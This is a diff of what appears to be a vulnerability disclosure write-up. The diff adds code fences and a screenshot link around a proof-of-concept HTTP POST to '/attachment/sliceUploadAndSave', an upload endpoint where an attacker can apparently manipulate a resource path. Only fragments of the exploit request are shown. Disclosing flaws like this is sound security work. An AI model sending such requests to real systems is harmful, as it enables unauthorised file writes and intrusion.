@@ -11,6 +11,7 @@ This creates a vulnerability where an attacker could manipulate resource_temp_pa
 This vulnerability is a backend issue that requires logging into the backend with a token to invoke. Please set up and log in by yourself.
 
 POC：
+```
 POST /attachment/sliceUploadAndSave HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
@@ -55,7 +56,9 @@ Content-Disposition: form-data; name="resource_name"
 
 11.png
 ------geckoformboundary13d3934e0299a09e8748d146bfb9d483--
+```
 
+![image](https://github.com/user-attachments/assets/b670c180-df77-4e0d-9e13-7e02c7e8308e)
 
 
 Access URL:  
